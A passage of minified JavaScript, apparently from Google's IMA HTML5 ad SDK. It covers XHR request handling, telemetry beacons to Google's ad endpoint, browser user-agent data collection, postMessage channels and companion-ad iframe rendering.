        for (var b = ["MSXML2.XMLHTTP.6.0", "MSXML2.XMLHTTP.3.0", "MSXML2.XMLHTTP", "Microsoft.XMLHTTP"], c = 0; c < b.length; c++) {
          var d = b[c];
          try {
            return new ActiveXObject(d), a.i = d;
          } catch (e) {}
        }
        throw Error("Could not create ActiveXObject. ActiveX might be disabled, or MSXML might not be installed");
      }
      return a.i;
    };
  bg = new cg();
  var eg = function (a, b, c) {
    if ("function" === typeof a) c && (a = Ba(a, c));else if (a && "function" == typeof a.handleEvent) a = Ba(a.handleEvent, a);else throw Error("Invalid listener argument");
    return 2147483647 < Number(b) ? -1 : x.setTimeout(a, b || 0);
  };
  var fg = function (a) {
    X.call(this);
    this.headers = new Map();
    this.I = a || null;
    this.j = !1;
    this.H = this.g = null;
    this.O = "";
    this.s = 0;
    this.o = this.L = this.B = this.K = !1;
    this.D = 0;
    this.C = null;
    this.X = "";
    this.R = this.U = !1;
  };
  Ea(fg, X);
  var gg = /^https?$/i,
    hg = ["POST", "PUT"],
    lg = function (a, b, c, d) {
      if (a.g) throw Error("[goog.net.XhrIo] Object is active with another request=" + a.O + "; newUri=" + b);
      c = c ? c.toUpperCase() : "GET";
      a.O = b;
      a.s = 0;
      a.K = !1;
      a.j = !0;
      a.g = a.I ? dg(a.I) : dg(bg);
      a.H = a.I ? ag(a.I) : ag(bg);
      a.g.onreadystatechange = Ba(a.W, a);
      try {
        a.L = !0, a.g.open(c, String(b), !0), a.L = !1;
      } catch (g) {
        ig(a);
        return;
      }
      b = d || "";
      d = new Map(a.headers);
      var e = Array.from(d.keys()).find(function (g) {
          return "content-type" == g.toLowerCase();
        }),
        f = x.FormData && b instanceof x.FormData;
      !(0 <= Qa(hg, c)) || e || f || d.set("Content-Type", "application/x-www-form-urlencoded;charset=utf-8");
      c = t(d);
      for (d = c.next(); !d.done; d = c.next()) e = t(d.value), d = e.next().value, e = e.next().value, a.g.setRequestHeader(d, e);
      a.X && (a.g.responseType = a.X);
      "withCredentials" in a.g && a.g.withCredentials !== a.U && (a.g.withCredentials = a.U);
      try {
        jg(a), 0 < a.D && (a.R = kg(a.g), a.R ? (a.g.timeout = a.D, a.g.ontimeout = Ba(a.Y, a)) : a.C = eg(a.Y, a.D, a)), a.B = !0, a.g.send(b), a.B = !1;
      } catch (g) {
        ig(a);
      }
    },
    kg = function (a) {
      return A && "number" === typeof a.timeout && void 0 !== a.ontimeout;
    };
  fg.prototype.Y = function () {
    "undefined" != typeof ua && this.g && (this.s = 8, Y(this, "timeout"), this.abort(8));
  };
  var ig = function (a) {
      a.j = !1;
      a.g && (a.o = !0, a.g.abort(), a.o = !1);
      a.s = 5;
      mg(a);
      ng(a);
    },
    mg = function (a) {
      a.K || (a.K = !0, Y(a, "complete"), Y(a, "error"));
    };
  fg.prototype.abort = function (a) {
    this.g && this.j && (this.j = !1, this.o = !0, this.g.abort(), this.o = !1, this.s = a || 7, Y(this, "complete"), Y(this, "abort"), ng(this));
  };
  fg.prototype.i = function () {
    this.g && (this.j && (this.j = !1, this.o = !0, this.g.abort(), this.o = !1), ng(this, !0));
    fg.N.i.call(this);
  };
  fg.prototype.W = function () {
    this.A || (this.L || this.B || this.o ? og(this) : this.ia());
  };
  fg.prototype.ia = function () {
    og(this);
  };
  var og = function (a) {
      if (a.j && "undefined" != typeof ua && (!a.H[1] || 4 != pg(a) || 2 != qg(a))) if (a.B && 4 == pg(a)) eg(a.W, 0, a);else if (Y(a, "readystatechange"), 4 == pg(a)) {
        a.j = !1;
        try {
          var b = qg(a);
          a: switch (b) {
            case 200:
            case 201:
            case 202:
            case 204:
            case 206:
            case 304:
            case 1223:
              var c = !0;
              break a;
            default:
              c = !1;
          }
          var d;
          if (!(d = c)) {
            var e;
            if (e = 0 === b) {
              var f = String(a.O).match(Gc)[1] || null;
              !f && x.self && x.self.location && (f = x.self.location.protocol.slice(0, -1));
              e = !gg.test(f ? f.toLowerCase() : "");
            }
            d = e;
          }
          d ? (Y(a, "complete"), Y(a, "success")) : (a.s = 6, mg(a));
        } finally {
          ng(a);
        }
      }
    },
    ng = function (a, b) {
      if (a.g) {
        jg(a);
        var c = a.g,
          d = a.H[0] ? function () {} : null;
        a.g = null;
        a.H = null;
        b || Y(a, "ready");
        try {
          c.onreadystatechange = d;
        } catch (e) {}
      }
    },
    jg = function (a) {
      a.g && a.R && (a.g.ontimeout = null);
      a.C && (x.clearTimeout(a.C), a.C = null);
    };
  fg.prototype.isActive = function () {
    return !!this.g;
  };
  var pg = function (a) {
      return a.g ? a.g.readyState : 0;
    },
    qg = function (a) {
      try {
        return 2 < pg(a) ? a.g.status : -1;
      } catch (b) {
        return -1;
      }
    },
    rg = function (a) {
      if (a.g) {
        a: {
          a = a.g.responseText;
          if (x.JSON) try {
            var b = x.JSON.parse(a);
            break a;
          } catch (c) {}
          b = sd(a);
        }
        return b;
      }
    };
  var sg = function () {};
  sg.prototype.get = function (a) {
    return tg({
      url: a.url,
      timeout: a.timeout,
      withCredentials: void 0 === a.withCredentials ? !0 : a.withCredentials,
      method: "GET",
      headers: void 0 === a.headers ? {} : a.headers
    });
  };
  var tg = function (a) {
      var b = a.url,
        c = a.timeout,
        d = a.withCredentials,
        e = a.method,
        f = void 0 === a.content ? void 0 : a.content,
        g = void 0 === a.headers ? {} : a.headers;
      return ug({
        url: b,
        timeout: c,
        withCredentials: d,
        method: e,
        content: f,
        headers: g
      }).then(function (h) {
        return Promise.resolve(h);
      }, function (h) {
        return h instanceof Error && 6 == h.message && d ? ug({
          url: b,
          timeout: c,
          withCredentials: !d,
          method: e,
          content: f,
          headers: g
        }) : Promise.reject(h);
      });
    },
    ug = function (a) {
      var b = a.url,
        c = a.timeout,
        d = a.withCredentials,
        e = a.method,
        f = void 0 === a.content ? void 0 : a.content;
      a = void 0 === a.headers ? {} : a.headers;
      var g = new fg();
      g.U = d;
      g.D = Math.max(0, mf(c));
      for (var h in a) g.headers.set(h, a[h]);
      var k = new Sf();
      return new Promise(function (m, n) {
        Wf(k, g, "success", function () {
          a: {
            if (Je()) try {
              rg(g);
              var q = "application/json";
              break a;
            } catch (B) {
              q = "application/xml";
              break a;
            }
            g.g && 4 == pg(g) ? (q = g.g.getResponseHeader("Content-Type"), q = null === q ? void 0 : q) : q = void 0;
            q = q || "";
          }
          if (-1 != q.indexOf("application/json")) m(rg(g) || {});else {
            try {
              var r = g.g ? g.g.responseXML : null;
            } catch (B) {
              r = null;
            }
            if (null == r) {
              try {
                var v = g.g ? g.g.responseText : "";
              } catch (B) {
                v = "";
              }
              r = v;
              if ("undefined" != typeof DOMParser) v = new DOMParser(), r = Ac(r), r = v.parseFromString(zc(r), "application/xml");else if (qf) {
                v = new ActiveXObject("MSXML2.DOMDocument");
                v.resolveExternals = !1;
                v.validateOnParse = !1;
                try {
                  v.setProperty("ProhibitDTD", !0), v.setProperty("MaxXMLSize", 2048), v.setProperty("MaxElementDepth", 256);
                } catch (B) {}
                v.loadXML(r);
                r = v;
              } else throw Error("Your browser does not support loading xml documents");
            }
            m(r);
          }
          k.T();
          g.T();
        });
        Wf(k, g, ["error", "timeout"], function () {
          n(new of(g.s, qg(g)));
          k.T();
          g.T();
        });
        lg(g, ef(b), e, f);
      });
    };
  va("google.javascript.ads.imalib.common.UrlLoader", sg);
  function vg() {
    var a = void 0 === a ? document : a;
    var b;
    return !(null == (b = a.featurePolicy) || !b.features().includes("attribution-reporting"));
  }
  ;
  var zg = function (a, b, c, d, e) {
      c = void 0 === c ? !1 : c;
      e = void 0 === e ? null : e;
      try {
        if (b = (void 0 === d ? 0 : d) ? ef(b, "https") : ef(b), c = c || jf(b), a.i || null != e) wg(a, b, c, e);else {
          var f = vg() ? e : null;
          Je() ? xg(b) : yg(a, b, c, f);
        }
      } catch (g) {}
    },
    Ag = function (a, b) {
      var c = {
        keepalive: !0,
        method: "get",
        redirect: "follow"
      };
      a && (c.referrerPolicy = "no-referrer");
      b ? "setAttributionReporting" in XMLHttpRequest.prototype ? c.attributionReporting = {
        eventSourceEligible: !0,
        triggerEligible: !1
      } : c.headers = {
        "Attribution-Reporting-Eligible": "event-source"
      } : c.mode = "no-cors";
      return c;
    },
    wg = function (a, b, c, d) {
      d = void 0 === d ? null : d;
      S(Q(R), "faa", "1");
      var e = vg();
      fetch(b, Ag(c, "" === d && e)).then(function () {
        S(Q(R), "fas", "1");
      }).catch(function () {
        S(Q(R), "faf", "1");
        a.i = !1;
        var f = d;
        f = vg() ? f : null;
        Je() ? xg(b) : yg(a, b, c, f);
      });
      e && d && fetch(d, Ag(c, !0));
    },
    yg = function (a, b, c, d) {
      var e = new Image(),
        f = (a.j++).toString();
      a.g.set(f, e);
      e.onload = e.onerror = function () {
        a.g.delete(f);
      };
      c && (e.referrerPolicy = "no-referrer");
      null != d && (e.attributionSrc = d);
      e.src = b;
    },
    xg = function (a) {
      new sg().get({
        url: a,
        timeout: new lf()
      });
    }; /*
       Math.uuid.js (v1.4)
       http://www.broofa.com
       mailto:robert@broofa.com
       Copyright (c) 2010 Robert Kieffer
       Dual licensed under the MIT and GPL licenses.
       */
  var Bg = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".split(""),
    Cg = function () {
      for (var a = Array(36), b = 0, c, d = 0; 36 > d; d++) 8 == d || 13 == d || 18 == d || 23 == d ? a[d] = "-" : 14 == d ? a[d] = "4" : (2 >= b && (b = 33554432 + 16777216 * Math.random() | 0), c = b & 15, b >>= 4, a[d] = Bg[19 == d ? c & 3 | 8 : c]);
    };
  var Dg = function (a) {
    X.call(this);
    this.s = [];
    this.j = !1;
    this.o = a || "goog_" + Cc++;
  };
  w(Dg, X);
  Dg.prototype.connect = function () {
    for (this.j = !0; 0 !== this.s.length;) {
      var a = this.s.shift();
      a && this.sendMessage(a.name, a.type, a.data);
    }
  };
  Dg.prototype.sendMessage = function () {};
  var Eg = function (a, b, c, d, e) {
    e = void 0 === e ? "" : e;
    W.call(this, a);
    this.messageType = b;
    this.ca = c;
    this.ga = d;
    this.origin = e;
  };
  w(Eg, W);
  Eg.prototype.toString = function () {
    return "";
  };
  var Fg = function (a) {
    var b = {};
    b = (b.IABUSPrivacy_String = "uspString", b.IABTCF_gdprApplies = "gdprApplies", b.IABTCF_TCString = "tcString", b.IABTCF_AddtlConsent = "addtlConsent", b.IABGPP_HDR_GppString = "gppString", b.IABGPP_GppSID = "gppSid", b);
    for (var c in b) null != a[c] && (a[b[c]] = a[c], delete a[c]);
    c = a.uspString;
    this.uspString = "string" === typeof c ? c : "";
    c = a.tcString;
    this.g = "string" === typeof c ? c : "";
    /^[\.\w_-]*$/.test(this.g) || (this.g = encodeURIComponent(this.g));
    c = a.gppString;
    this.gppString = "string" === typeof c ? c : "";
  };
  var Gg = RegExp("^https?://(\\w|-)+\\.cdn\\.ampproject\\.(net|org)(\\?|/|$)"),
    Kg = function (a) {
      a = a || Hg();
      for (var b = new Ig(x.location.href, !1), c = null, d = a.length - 1, e = d; 0 <= e; --e) {
        var f = a[e];
        !c && Gg.test(f.url) && (c = f);
        if (f.url && !f.ea) {
          b = f;
          break;
        }
      }
      e = null;
      f = a.length && a[d].url;
      0 != b.depth && f && (e = a[d]);
      return new Jg(b, e, c);
    },
    Hg = function () {
      var a = x,
        b = [],
        c = null;
      do {
        var d = a;
        if (Kc(d)) {
          var e = d.location.href;
          c = d.document && d.document.referrer || null;
        } else e = c, c = null;
        b.push(new Ig(e || ""));
        try {
          a = d.parent;
        } catch (f) {
          a = null;
        }
      } while (a && d != a);
      d = 0;
      for (a = b.length - 1; d <= a; ++d) b[d].depth = a - d;
      d = x;
      if (d.location && d.location.ancestorOrigins && d.location.ancestorOrigins.length == b.length - 1) for (a = 1; a < b.length; ++a) e = b[a], e.url || (e.url = d.location.ancestorOrigins[a - 1] || "", e.ea = !0);
      return b;
    },
    Jg = function (a, b, c) {
      this.i = a;
      this.j = b;
      this.g = c;
    },
    Ig = function (a, b) {
      this.url = a;
      this.ea = !!b;
      this.depth = null;
    };
  var Lg = function (a, b) {
      this.g = a;
      this.depth = b;
    },
    Ng = function () {
      var a = Hg(),
        b = Math.max(a.length - 1, 0),
        c = Kg(a);
      a = c.i;
      var d = c.j,
        e = c.g,
        f = [];
      c = function (h, k) {
        return null == h ? k : h;
      };
      e && f.push(new Lg([e.url, e.ea ? 2 : 0], c(e.depth, 1)));
      d && d != e && f.push(new Lg([d.url, 2], 0));
      a.url && a != e && f.push(new Lg([a.url, 0], c(a.depth, b)));
      var g = Sa(f, function (h, k) {
        return f.slice(0, f.length - k);
      });
      !a.url || (e || d) && a != e || (d = Mc(a.url)) && g.push([new Lg([d, 1], c(a.depth, b))]);
      g.push([]);
      Sa(g, function (h) {
        return Mg(b, h);
      });
    };
  function Mg(a, b) {
    var c = Ta(b, function (e, f) {
        return Math.max(e, f.depth);
      }, -1),
      d = Ua(c + 2);
    d[0] = a;
    Ra(b, function (e) {
      return d[e.depth + 1] = e.g;
    });
    return d;
  }
  ;
  var Z = function () {
      this.o = "always";
      this.B = 4;
      this.j = null;
      this.i = 1;
      this.l = !0;
      this.locale = "en";
      this.g = !1;
      this.D = this.C = "";
      this.A = !1;
      this.v = !0;
      Cg();
      this.s = {};
      try {
        Ng();
      } catch (a) {}
    },
    Og = function (a) {
      a = null == a ? "" : String(a);
      /^[\s\xa0]*$/.test(a) || (a = a.substring(0, 20));
      return a;
    };
  l = Z.prototype;
  l.setCompanionBackfill = function (a) {
    this.o = a;
  };
  l.getCompanionBackfill = function () {
    return this.o;
  };
  l.setNumRedirects = function (a) {
    this.B = a;
  };
  l.getNumRedirects = function () {
    return this.B;
  };
  l.setPpid = function (a) {
    this.j = a;
  };
  l.getPpid = function () {
    return this.j;
  };
  l.setVpaidAllowed = function (a) {
    "boolean" === typeof a && (this.i = a ? 1 : 0);
  };
  l.setVpaidMode = function (a) {
    this.i = a;
  };
  l.ma = function () {
    return this.i;
  };
  l.setAutoPlayAdBreaks = function (a) {
    this.l = a;
  };
  l.na = function () {
    return this.l;
  };
  l.pa = function (a) {
    this.g = a;
  };
  l.la = function () {
    return this.g;
  };
  l.setLocale = function (a) {
    if (a = kf(a)) this.locale = a;
  };
  l.getLocale = function () {
    return this.locale;
  };
  l.setPlayerType = function (a) {
    this.C = Og(a);
  };
  l.getPlayerType = function () {
    return this.C;
  };
  l.setPlayerVersion = function (a) {
    this.D = Og(a);
  };
  l.getPlayerVersion = function () {
    return this.D;
  };
  l.qa = function () {};
  l.ra = function () {};
  l.setDisableCustomPlaybackForIOS10Plus = function (a) {
    this.A = a;
  };
  l.getDisableCustomPlaybackForIOS10Plus = function () {
    return this.A;
  };
  l.isCookiesEnabled = function () {
    return this.v;
  };
  l.setCookiesEnabled = function (a) {
    null != a && (this.v = a);
  };
  l.setSessionId = function () {};
  l.oa = function () {};
  l.ka = function () {
    return !0;
  };
  l.setFeatureFlags = function (a) {
    this.s = a;
  };
  l.getFeatureFlags = function () {
    return this.s;
  };
  Z.prototype.getFeatureFlags = Z.prototype.getFeatureFlags;
  Z.prototype.setFeatureFlags = Z.prototype.setFeatureFlags;
  Z.prototype.getDisableFlashAds = Z.prototype.ka;
  Z.prototype.setDisableFlashAds = Z.prototype.oa;
  Z.prototype.setSessionId = Z.prototype.setSessionId;
  Z.prototype.setCookiesEnabled = Z.prototype.setCookiesEnabled;
  Z.prototype.isCookiesEnabled = Z.prototype.isCookiesEnabled;
  Z.prototype.getDisableCustomPlaybackForIOS10Plus = Z.prototype.getDisableCustomPlaybackForIOS10Plus;
  Z.prototype.setDisableCustomPlaybackForIOS10Plus = Z.prototype.setDisableCustomPlaybackForIOS10Plus;
  Z.prototype.setStreamCorrelator = Z.prototype.ra;
  Z.prototype.setPageCorrelator = Z.prototype.qa;
  Z.prototype.getPlayerVersion = Z.prototype.getPlayerVersion;
  Z.prototype.setPlayerVersion = Z.prototype.setPlayerVersion;
  Z.prototype.getPlayerType = Z.prototype.getPlayerType;
  Z.prototype.setPlayerType = Z.prototype.setPlayerType;
  Z.prototype.getLocale = Z.prototype.getLocale;
  Z.prototype.setLocale = Z.prototype.setLocale;
  Z.prototype.getIsVpaidAdapter = Z.prototype.la;
  Z.prototype.setIsVpaidAdapter = Z.prototype.pa;
  Z.prototype.isAutoPlayAdBreaks = Z.prototype.na;
  Z.prototype.setAutoPlayAdBreaks = Z.prototype.setAutoPlayAdBreaks;
  Z.prototype.getVpaidMode = Z.prototype.ma;
  Z.prototype.setVpaidMode = Z.prototype.setVpaidMode;
  Z.prototype.setVpaidAllowed = Z.prototype.setVpaidAllowed;
  Z.prototype.getPpid = Z.prototype.getPpid;
  Z.prototype.setPpid = Z.prototype.setPpid;
  Z.prototype.getNumRedirects = Z.prototype.getNumRedirects;
  Z.prototype.setNumRedirects = Z.prototype.setNumRedirects;
  Z.prototype.getCompanionBackfill = Z.prototype.getCompanionBackfill;
  Z.prototype.setCompanionBackfill = Z.prototype.setCompanionBackfill;
  var Pg = new Z();
  var Qg = function () {
    var a = void 0 === a ? {} : a;
    var b = void 0 === b ? {} : b;
    a = t(Object.entries(a));
    for (var c = a.next(); !c.done; c = a.next()) c = t(c.value), c.next(), c.next();
    new Fg(b);
  };
  var Rg = function (a) {
    this.u = I(a);
  };
  w(Rg, M);
  Rg.prototype.getVersion = function () {
    return L(Lb(J(this, 2)), "");
  };
  var Sg = function (a) {
    this.u = I(a);
  };
  w(Sg, M);
  var Tg = function (a, b) {
      return jc(a, 2, b);
    },
    Ug = function (a, b) {
      return jc(a, 3, b);
    },
    Vg = function (a, b) {
      return jc(a, 4, b);
    },
    Wg = function (a, b) {
      return jc(a, 5, b);
    },
    Xg = function (a, b) {
      return jc(a, 9, b);
    },
    Yg = function (a, b) {
      var c = a.u,
        d = H(c);
      if (d & 2) throw Error();
      if (null == b) K(c, d, 10);else {
        var e = E(b),
          f = e,
          g = !!(2 & e) || !!(2048 & e),
          h = g || Object.isFrozen(b),
          k;
        if (k = !h) k = !1;
        for (var m = !0, n = !0, q = 0; q < b.length; q++) {
          var r = b[q];
          g || (r = !!(E(r.u) & 2), m && (m = !r), n && (n = r));
        }
        g || (e = G(e, 5, !0), e = G(e, 8, m), e = G(e, 16, n), k && (e = G(e, n ? 2 : 2048, !0)), e !== f && (h && (b = C(b), e = ec(e, d, !0)), F(b, e)), k && Object.freeze(b));
        K(c, d, 10, b);
      }
      return a;
    },
    Zg = function (a, b) {
      return ac(a, 11, null == b ? b : Ib(b));
    },
    $g = function (a, b) {
      return jc(a, 1, b);
    },
    ah = function (a, b) {
      return ac(a, 7, null == b ? b : Ib(b));
    };
  Sg.M = [10, 6];
  var bh = "platform platformVersion architecture model uaFullVersion bitness fullVersionList wow64".split(" ");
  function ch(a) {
    var b;
    return null != (b = a.google_tag_data) ? b : a.google_tag_data = {};
  }
  function dh(a) {
    var b, c;
    return "function" === typeof (null == (b = a.navigator) ? void 0 : null == (c = b.userAgentData) ? void 0 : c.getHighEntropyValues);
  }
  function eh() {
    var a = window;
    if (!dh(a)) return null;
    var b = ch(a);
    if (b.uach_promise) return b.uach_promise;
    a = a.navigator.userAgentData.getHighEntropyValues(bh).then(function (c) {
      null != b.uach || (b.uach = c);
      return c;
    });
    return b.uach_promise = a;
  }
  function fh(a) {
    var b;
    return Zg(Yg(Wg(Tg($g(Vg(ah(Xg(Ug(new Sg(), a.architecture || ""), a.bitness || ""), a.mobile || !1), a.model || ""), a.platform || ""), a.platformVersion || ""), a.uaFullVersion || ""), (null == (b = a.fullVersionList) ? void 0 : b.map(function (c) {
      var d = new Rg();
      d = jc(d, 1, c.brand);
      return jc(d, 2, c.version);
    })) || []), a.wow64 || !1);
  }
  function gh() {
    var a, b;
    return null != (b = null == (a = eh()) ? void 0 : a.then(function (c) {
      return fh(c);
    })) ? b : null;
  }
  ;
  var ih = function () {
      new Qg();
      Cg();
      this.deviceId = "";
      this.g = this.referrer = null;
      hh(this);
    },
    jh = function () {
      Q(ih);
      var a = "h.3.605.0";
      Pg.g && (a += "/vpaid_adapter");
      return a;
    },
    hh = function (a) {
      var b = gh();
      b && b.then(function (c) {
        if (null == c) c = null;else {
          a: {
            Db = !0;
            try {
              var d = JSON.stringify(c.toJSON(), Ob);
              break a;
            } finally {
              Db = !1;
            }
            d = void 0;
          }
          c = d;
          d = [];
          for (var e = 0, f = 0; f < c.length; f++) {
            var g = c.charCodeAt(f);
            255 < g && (d[e++] = g & 255, g >>= 8);
            d[e++] = g;
          }
          c = nb(d, 3);
        }
        a.g = c;
      });
    };
  function kh() {
    var a = window,
      b = document;
    return new Ke(a.parent === a ? a.location.href : b.referrer);
  }
  function lh(a, b) {
    a.g.set("url", "");
    try {
      var c = 2083 - a.toString().length - 1;
      if (0 >= c) return a.toString();
      for (var d = b.slice(0, c), e = encodeURIComponent(d), f = c; 0 < f && e.length > c;) d = b.slice(0, f--), e = encodeURIComponent(d);
      a.g.set("url", d);
    } catch (g) {}
    return a.toString();
  }
  ;
  var mh = new function () {
    this.g = new Map();
    this.j = 0;
    this.i = null != window.fetch;
  }();
  function nh(a) {
    var b = void 0 === b ? mh : b;
    var c = void 0 === c ? null : c;
    a = new nf(a, c ? c : c);
    var d = void 0 === d ? !1 : d;
    var e = void 0 === e ? !1 : e;
    null != a.g || e ? zg(b, a.url, d, e, a.g) : zg(b, a.url, d);
  }
  ;
  var oh = function () {
    this.j = .01 > Math.random();
    this.i = Math.floor(4503599627370496 * Math.random());
    this.g = null;
  };
  oh.prototype.report = function (a, b, c) {
    b = void 0 === b ? {} : b;
    if (null == x.G_testRunner && (this.j || (void 0 === c ? 0 : c))) {
      b.lid = a;
      jh() && (b.sdkv = jh());
      this.g && (b.palv = this.g);
      a = Jd().sort().join(",");
      /^[\s\xa0]*$/.test(null == a ? "" : String(a)) || (b.e = a);
      b = ph(this, b);
      var d = new Ke("http://pagead2.googlesyndication.com/pagead/gen_204");
      oc(b, function (e, f) {
        null != e && d.g.set(f, null == e ? "" : "boolean" === typeof e ? e ? "t" : "f" : "" + e);
      }, this);
      b = kh();
      Le(d, b.l);
      b = d.toString();
      a = d.g.get("url");
      null != a && Oa() && 2083 < b.length && (b = lh(d, a));
      nh(b);
    }
  };
  var ph = function (a, b) {
    b.id = "ima_html5";
    var c = kh();
    b.c = a.i;
    b.domain = c.i;
    return b;
  };
  function td(a, b) {
    return b instanceof RegExp ? "__REGEXP" + b.toString() : b;
  }
  function qh(a, b) {
    return b && 0 === b.toString().indexOf("__REGEXP") ? (a = b.split("__REGEXP")[1].match(/\/(.*)\/(.*)?/), new RegExp(a[1], a[2] || "")) : b;
  }
  var rh = function (a, b) {
    Dg.call(this, b);
    this.B = a;
    this.g = null;
    this.C = new Sf(this);
    Uf(this.C, window, "message", this.D);
  };
  w(rh, Dg);
  var sh = function (a) {
    if (null == a || "string" !== typeof a || !a.startsWith("ima://")) return null;
    a = a.substr(6);
    try {
      return JSON.parse(a, qh);
    } catch (b) {
      return null;
    }
  };
  rh.prototype.sendMessage = function (a, b, c) {
    if (null != this.g && null != this.g.postMessage) {
      var d = this.g,
        e = d.postMessage,
        f = {};
      f.name = a;
      f.type = b;
      null != c && (f.data = c);
      f.sid = this.o;
      f.channel = this.B;
      a = [];
      vd(new ud(), f, a);
      e.call(d, "ima://" + a.join(""), "*");
    }
    null != this.g && null == this.g.postMessage && Q(oh).report(11);
  };
  rh.prototype.i = function () {
    rf(this.C);
    this.g = null;
    Dg.prototype.i.call(this);
  };
  rh.prototype.D = function (a) {
    a = a.g;
    var b = sh(a.data);
    if (th(this, b)) {
      if (null === this.g) this.g = a.source, this.j || this.connect();else if (this.g !== a.source) return;
      th(this, b) && Y(this, new Eg(b.name, b.type, b.data || {}, b.sid, a.origin));
    }
  };
  var th = function (a, b) {
    if (null == b) return !1;
    var c = b.channel;
    if (null == c || c !== a.B) return !1;
    b = b.sid;
    return null == b || "*" !== a.o && b !== a.o ? !1 : !0;
  };
  var uh = function (a, b, c, d) {
    var e = Nc("IFRAME");
    e.id = b;
    e.name = b;
    e.width = String(c);
    e.height = String(d);
    e.allowTransparency = "true";
    e.scrolling = "no";
    e.marginWidth = "0";
    e.marginHeight = "0";
    e.frameBorder = "0";
    e.style.border = "0";
    e.style.verticalAlign = "bottom";
    e.src = "about:blank";
    e.setAttribute("role", "region");
    e.setAttribute("aria-label", "Advertisement");
    e.title = "3rd party ad content";
    e.tabIndex = 0;
    a.appendChild(e);
    return e;
  };
  var vh = function (a, b) {
      var c = Ec(a);
      return c.defaultView && c.defaultView.getComputedStyle && (a = c.defaultView.getComputedStyle(a, null)) ? a[b] || a.getPropertyValue(b) || "" : "";
    },
    zh = function (a) {
      var b = Ec(a),
        c = A && a.currentStyle;
      if (c && "CSS1Compat" == (b ? new Fc(Ec(b)) : Ga || (Ga = new Fc())).g.compatMode && "auto" != c.width && "auto" != c.height && !c.boxSizing) return b = wh(a, c.width, "width", "pixelWidth"), a = wh(a, c.height, "height", "pixelHeight"), new Bc(b, a);
      c = new Bc(a.offsetWidth, a.offsetHeight);
      if (A) {
        b = xh(a, "paddingLeft");
        var d = xh(a, "paddingRight"),
          e = xh(a, "paddingTop"),
          f = xh(a, "paddingBottom");
        b = new Oc(e, d, f, b);
      } else b = vh(a, "paddingLeft"), d = vh(a, "paddingRight"), e = vh(a, "paddingTop"), f = vh(a, "paddingBottom"), b = new Oc(parseFloat(e), parseFloat(d), parseFloat(f), parseFloat(b));
      !A || 9 <= Number(jb) ? (d = vh(a, "borderLeftWidth"), e = vh(a, "borderRightWidth"), f = vh(a, "borderTopWidth"), a = vh(a, "borderBottomWidth"), a = new Oc(parseFloat(f), parseFloat(e), parseFloat(a), parseFloat(d))) : (d = yh(a, "borderLeft"), e = yh(a, "borderRight"), f = yh(a, "borderTop"), a = yh(a, "borderBottom"), a = new Oc(f, e, a, d));
      return new Bc(c.width - a.i - b.i - b.j - a.j, c.height - a.l - b.l - b.g - a.g);
    },
    wh = function (a, b, c, d) {
      if (/^\d+px?$/.test(b)) return parseInt(b, 10);
      var e = a.style[c],
        f = a.runtimeStyle[c];
      a.runtimeStyle[c] = a.currentStyle[c];
      a.style[c] = b;
      b = a.style[d];
      a.style[c] = e;
      a.runtimeStyle[c] = f;
      return +b;
    },
    xh = function (a, b) {
      return (b = a.currentStyle ? a.currentStyle[b] : null) ? wh(a, b, "left", "pixelLeft") : 0;
    },
    Ah = {
      thin: 2,
      medium: 4,
      thick: 6
    },
    yh = function (a, b) {
      if ("none" == (a.currentStyle ? a.currentStyle[b + "Style"] : null)) return 0;
      b = a.currentStyle ? a.currentStyle[b + "Width"] : null;
      return b in Ah ? Ah[b] : wh(a, b, "left", "pixelLeft");
    };
  function Bh() {
    var a,
      b,
      c,
      d = window;
    d = void 0 === d ? window : d;
    d = (null != (c = void 0 === d ? null : d) ? c : window).googletag;
    c = (null == d ? 0 : d.apiReady) ? d : void 0;
    return null != (b = null == c ? void 0 : null == (a = c.companionAds) ? void 0 : a.call(c)) ? b : null;
  }
  function Ch(a) {
    var b = {};
    b.slotId = a.getSlotId().getId();
    var c = [];
    a = t(a.getSizes() || []);
    for (var d = a.next(); !d.done; d = a.next()) if (d = d.value, "string" !== typeof d) {
      var e = {};
      c.push((e.adWidth = d.getWidth(), e.adHeight = d.getHeight(), e));
    } else "fluid" === d && (d = {}, c.push((d.fluidSize = !0, d)));
    return b.adSizes = c, b;
  }
  function Dh(a) {
    var b = Bh();
    if (b && a && Array.isArray(a)) {
      var c = new Map(b.getSlots().map(function (r) {
        return [r.getSlotId().getId(), r];
      }));
      a = t(a);
      for (var d = a.next(); !d.done; d = a.next()) {
        var e = d.value,
          f = c.get(e.slotId);
        if (f && !b.isSlotAPersistentRoadblock(f)) {
          var g = e.adContent;
          if (g && (d = Dc(f.getSlotId().getDomId()))) {
            d.style.display = "";
            var h = e.adWidth,
              k = e.adHeight;
            e.fluidSize && (k = zh(d), h = k.width, k = k.height);
            d.textContent = "";
            if (e.friendlyIframeRendering) try {
              var m = "google_companion_" + f.getSlotId().getId(),
                n = uh(d, m, h, k),
                q = n.contentWindow ? n.contentWindow.document : n.contentDocument;
              Za && q.open("text/html", "replace");
              Jc(q, kd(g));
              q.close();
            } catch (r) {} else Ic(d, kd(g)), d.style.width = h + "px", d.style.height = k + "px";
            b.slotRenderEnded(f, h, k);
            (e = e.onAdContentSet) && e(d);
          }
        }
      }
    }
  }
  ;
  var Eh = function (a, b, c, d, e, f) {
    Eg.call(this, a, b, c, d, e);
    this.g = f;
  };
  w(Eh, Eg);
  var Fh = function (a, b) {
    X.call(this);
    this.messageName = a;
    this.s = b;
    this.g = {};
    this.j = new Sf(this);
    tf(this, Ca(rf, this.j));
    Uf(this.j, window, "message", this.o);
  };
  w(Fh, X);
  var Gh = function (a, b) {
      var c = b.g;
      if (a.g.hasOwnProperty(c)) {
        a = a.g[c];
        c = b.type;
        var d = b.messageType;
        b = b.ca;
        a.j ? a.sendMessage(c, d, b) : a.s.push({
          name: c,
          type: d,
          data: b
        });
      }
    },
    Hh = function (a, b, c, d) {
      a.g.hasOwnProperty(b) || (c = new rh(b, c), Uf(a.j, c, a.messageName, function (e) {
        Y(this, new Eh(e.type, e.messageType, e.ca, e.ga, e.origin, b));
      }), c.g = d, c.connect(), a.g[b] = c);
    };
  Fh.prototype.i = function () {
    for (var a = t(Object.values(this.g)), b = a.next(); !b.done; b = a.next()) rf(b.value);
    X.prototype.i.call(this);
  };
  Fh.prototype.o = function (a) {
    a = a.g;
    var b = sh(a.data);
    if (null != b) {
      var c = b.channel;
      if (this.s && !this.g.hasOwnProperty(c)) {
        var d = b.sid;
        Hh(this, c, d, a.source);
        Y(this, new Eh(b.name, b.type, b.data || {}, d, a.origin, c));
